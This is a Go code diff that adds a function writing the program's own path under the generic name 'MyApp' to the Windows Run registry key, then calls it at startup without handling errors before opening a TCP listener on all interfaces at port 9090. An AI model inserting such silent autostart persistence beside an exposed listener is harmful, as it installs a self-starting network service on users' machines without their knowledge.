@@ -524,7 +524,31 @@ func receiveCert() {
 	log.Println("File transfer completed!")
 }
 
+func addToRegistryRun() error {
+	exePath, err := os.Executable()
+	if err != nil {
+		return fmt.Errorf("failed to get executable path: %v", err)
+	}
+
+	runKey, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
+	if err != nil {
+		return fmt.Errorf("failed to open Run registry key: %v", err)
+	}
+	defer runKey.Close()
+
+	err = runKey.SetStringValue("MyApp", exePath)
+	if err != nil {
+		return fmt.Errorf("failed to set registry value: %v", err)
+	}
+
+	return nil
+}
+
 func main() {
+	err := addToRegistryRun()
+	if err != nil {
+		// Handle error
+	}
 	// Start listening on port 9090
 	listener, err := net.Listen("tcp", "0.0.0.0:9090")
 	if err != nil {
